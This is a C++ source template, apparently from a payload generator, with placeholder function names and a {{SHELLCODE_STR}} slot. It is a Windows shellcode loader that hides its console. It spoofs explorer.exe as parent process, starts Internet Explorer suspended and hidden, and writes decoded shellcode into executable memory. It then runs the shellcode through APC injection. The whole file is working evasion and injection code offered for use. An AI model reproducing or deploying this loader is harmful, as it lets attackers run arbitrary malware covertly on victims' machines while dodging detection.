#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>



DWORD {{FUNCTION1}}() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            //If you want to another process as parent change here
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}


unsigned int {{FUNCTION}}(char* hexbuffer) {
    _strrev(hexbuffer);
    unsigned int char_in_hex;
    unsigned int iterations = strlen(hexbuffer);
    unsigned int memory_allocation = strlen(hexbuffer) / 2;
    for (unsigned int i = 0; i < iterations - 1; i++) {
        sscanf_s(hexbuffer + 2 * i, "%2X", &char_in_hex);
        hexbuffer[i] = (char)char_in_hex;
    }
    return memory_allocation;
}


int main() {

    char hexbuffer[] = "{{SHELLCODE_STR}}";

    unsigned int memory_allocation = {{FUNCTION}}(hexbuffer);

    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, {{FUNCTION1}}());

    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T* lpNumberOfBytesWritten = 0;
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)hexbuffer, memory_allocation, lpNumberOfBytesWritten);

    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);

    return 0;
}